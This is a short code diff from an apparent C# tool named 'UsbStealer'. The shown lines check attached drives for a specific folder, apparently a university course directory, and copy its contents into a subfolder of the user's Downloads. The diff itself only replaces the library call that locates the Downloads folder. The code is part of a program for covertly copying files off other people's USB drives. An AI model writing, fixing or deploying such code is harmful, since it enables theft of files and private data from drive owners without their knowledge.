@@ -1,5 +1,4 @@
-﻿using Syroot.Windows.IO;
-using System;
+﻿using System;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Threading;
@@ -37,7 +36,8 @@ namespace UsbStealer
                     {
                         Console.WriteLine(dinfo.Name);
                         var path = dinfo.Name + @"смолгу\!для занятий\4П7_АИС";
-                        var newPath = new KnownFolder(KnownFolderType.Downloads).Path + @"\нужное";
+                        //var newPath = new KnownFolder(KnownFolderType.Downloads).Path + @"\нужное";
+                        var newPath = KnownFolders.GetPath(KnownFolder.Downloads) + @"\нужное";
                         if (Directory.Exists(path))
                         {
                             CreateDirectoies(path, newPath);
